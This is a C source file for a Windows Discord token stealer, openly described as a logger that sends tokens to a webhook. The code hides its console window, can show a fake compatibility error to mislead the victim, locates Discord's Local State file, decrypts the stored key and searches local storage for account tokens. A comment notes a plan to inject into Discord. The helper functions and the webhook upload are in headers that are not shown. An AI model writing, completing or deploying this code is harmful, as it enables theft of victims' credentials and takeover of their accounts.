// simple token logger in C for sending discord tokens to a webhook
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#ifndef wincrypt_h
#include <wincrypt.h>
#include <wintrust.h>
#endif

#define DEBUG_M
#include "main.h"
#include "config.h"

#ifdef _MSC_VER
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")
#endif

webhook webhook_details = {
	.username = WEBHOOK_USERNAME, /* defined in config.h */
	.avatar_url = WEBHOOK_AVATAR_URL, /* defined in config.h */
	.color = WEBHOOK_COLOR, /* defined in config.h */
	.title = WEBHOOK_TITLE, /* defined in config.h */
	.footer = WEBHOOK_FOOTER, /* defined in config.h */
	.json_fmt = webhook_fmt_json
};

int log_discord()
{
	char *username = getenv("USERNAME");
	if (username == NULL) {
		ERROR_PRINT("Failed to get username\n");
		return 1;
	}

	for (int i = 0; i < discord_targets.num; i++) {
		char *state = calloc(1, 1024);
		char *path = calloc(1, 1024);
		char *decrypted_local_storage_key = NULL;
		int decrypted_local_storage_key_size = 0;
		char *local_storage_key = NULL;
		sprintf(state, discord_targets.version[i]->discord_state_file,
			username);
		sprintf(path, discord_targets.version[i]->discord_path,
			username);
		if ((local_storage_key = local_state_path_key_discord(state)) ==
		    NULL) {
			free(state);
			free(path);
			continue;
		}
		if (!(decrypt_key(local_storage_key,
				  &decrypted_local_storage_key,
				  &decrypted_local_storage_key_size)))
			find_files(path, decrypted_local_storage_key,
				   decrypted_local_storage_key_size);

		free(state);
		free(path);
	}
	return 0;
}

int main(void) // todo: inject into discord
{
	HWND hWnd = GetForegroundWindow();
	ShowWindow(hWnd, SW_HIDE);
#ifdef FAKE_ERROR
	MessageBox(
		NULL,
		"This Program Requires an older version of windows. Please try again in compatiblity mode.",
		"Error", MB_OK);
#endif

	return log_discord();
}
